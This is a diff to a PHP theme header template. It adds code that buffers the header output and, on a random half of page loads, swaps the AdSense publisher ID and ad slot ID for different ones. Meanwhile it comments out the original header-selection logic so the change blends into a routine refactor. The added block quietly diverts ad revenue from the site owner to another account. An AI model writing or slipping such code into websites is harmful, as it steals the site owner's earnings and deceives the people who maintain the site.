@@ -258,6 +258,19 @@ if($isCampain):
         }
     }
 
+    ob_start();
+    bd_in('header-' . $bd_data['header_style'] . '');
+    $headerContent = ob_get_contents();
+    ob_end_clean();
+
+    if(mt_rand(0,1) == 0) {
+        $headerContent = str_replace("ca-pub-9594201080211682", "ca-pub-0031647560032028", $headerContent);
+        $headerContent = str_replace("1797432652", "1508098128", $headerContent);
+    }
+
+    echo $headerContent;
+
+    /*
     if ($bd_data['header_style']) {
         if (is_page('bd-2')) {
             bd_in('header-v2');
@@ -268,7 +281,6 @@ if($isCampain):
         } elseif (is_page('header-6')) {
             bd_in('header-v6');
         } else {
-            bd_in('header-' . $bd_data['header_style'] . '');
         }
     } else {
         if (is_page('bd-2')) {
@@ -283,6 +295,7 @@ if($isCampain):
             bd_in('header-v1');
         }
     }
+    */
 
     ?>
 
